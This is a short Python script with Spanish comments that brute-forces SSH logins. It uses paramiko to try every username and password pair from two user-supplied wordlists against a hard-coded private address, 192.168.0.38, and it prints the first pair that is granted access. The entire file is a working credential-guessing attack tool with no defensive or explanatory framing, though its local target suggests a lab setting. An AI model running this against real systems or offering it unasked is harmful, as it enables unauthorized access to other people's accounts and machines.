import paramiko
import signal, sys 


def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl_c
signal.signal(signal.SIGINT, def_handler)




# Especifica los detalles del servidor SSH
hostname = '192.168.0.38'
port = 22

# Solicita el nombre del archivo con nombres de usuario y contraseñas
archivo_usuarios = input("Introduce el nombre del archivo con los nombres de usuario: ")
archivo_contrasenas = input("Introduce el nombre del archivo con las contraseñas: ")

# Variable para indicar si se encontró una combinación válida
encontrada = False

try:
    with open(archivo_usuarios, 'r') as usuarios_file, open(archivo_contrasenas, 'r') as contrasenas_file:
        usuarios = usuarios_file.readlines()
        contrasenas = contrasenas_file.readlines()

        for usuario in usuarios:
            if encontrada:
                break  # Salir del bucle si ya se encontró una combinación válida
            for contrasena in contrasenas:
                username = usuario.strip()
                password = contrasena.strip()

                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                try:
                    ssh.connect(hostname, port, username, password)
                    print(f'Usuario: {username}, Contraseña: {password} - Acceso concedido')
                    encontrada = True  # Marcar que se encontró una combinación válida
                    ssh.close()
                    break  # Salir del bucle
                except paramiko.AuthenticationException:
                    pass  # Continuar con el siguiente intento si la autenticación falla
                except Exception as e:
                    print(f'Error: {e}')
except FileNotFoundError:
    print(f'Uno de los archivos no se encontró.')
except Exception as e:
    print(f'Error al abrir uno de los archivos: {e}')

